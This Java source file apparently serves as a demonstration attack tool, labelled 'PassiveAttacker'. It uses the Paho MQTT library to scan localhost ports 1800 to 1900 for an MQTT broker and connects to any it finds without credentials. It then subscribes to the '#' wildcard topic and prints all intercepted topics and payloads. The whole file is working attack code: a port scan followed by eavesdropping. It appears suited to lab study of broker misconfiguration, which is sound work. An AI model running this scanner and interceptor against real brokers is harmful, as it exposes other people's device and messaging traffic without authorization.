import org.eclipse.paho.client.mqttv3.*;
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;

import java.net.Socket;
import java.util.UUID;

public class PassiveAttacker implements MqttCallback {
    private static final String HOST = "localhost";
    private MqttClient client;

    public PassiveAttacker() {
        int mqttPort = discoverBroker();

        if (mqttPort == -1) {
            System.out.println("[ATTACKER] No MQTT broker found.");

            return;
        }

        connectAndListen(mqttPort);
    }

    private int discoverBroker() {
        System.out.println("[ATTACKER] Scanning for MQTT brokers...");

        for (int port = 1800; port <= 1900; port++) {
            try {
                System.out.println("[ATTACKER] Try port: " + port);
                // Check if port open
                Socket socket = new Socket(HOST, port);

                socket.close();

                System.out.println("[ATTACKER] Open port found: " + port);

                // Attempt MQTT handshake
                String broker = "tcp://" + HOST + ":" + port;

                String clientId = "scanner-" + UUID.randomUUID();

                MqttClient testClient = new MqttClient(broker, clientId);

                MqttConnectOptions options = new MqttConnectOptions();

                options.setConnectionTimeout(1);

                testClient.connect(options);

                System.out.println("[ATTACKER] MQTT broker detected on port " + port);

                testClient.disconnect();

                return port;

            } catch (Exception ignored) {

            }
        }
        return -1;
    }

    private void connectAndListen(int port) {
        try {
            String broker = "tcp://" + HOST + ":" + port;
            String clientID = "PassiveAttacker-" + UUID.randomUUID();

            client = new MqttClient(broker, clientID, new MemoryPersistence());

            MqttConnectOptions opts = new MqttConnectOptions();

            opts.setAutomaticReconnect(true);
            opts.setCleanSession(true);

            client.connect(opts);
            client.setCallback(this);

            System.out.println("[ATTACKER] Connected to broker.");

            client.subscribe("#", (topic, message) -> {
                String payload = new String(message.getPayload());

                System.out.println("\n==================");
                System.out.println("[INTERCEPTED]");
                System.out.println("TOPIC: " + topic);
                System.out.println("PAYLOAD: " + payload);
                System.out.println("==================");
            });

            System.out.println("[ATTACKER] Listening to all traffic...");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new PassiveAttacker();

        while (true) {
            try {
                Thread.sleep(1000);
            } catch (Exception ignored) {}
        }
    }

    @Override
    public void connectionLost(Throwable throwable) {

    }

    @Override
    public void messageArrived(String s, MqttMessage mqttMessage) throws Exception {

    }

    @Override
    public void deliveryComplete(IMqttDeliveryToken iMqttDeliveryToken) {

    }
}
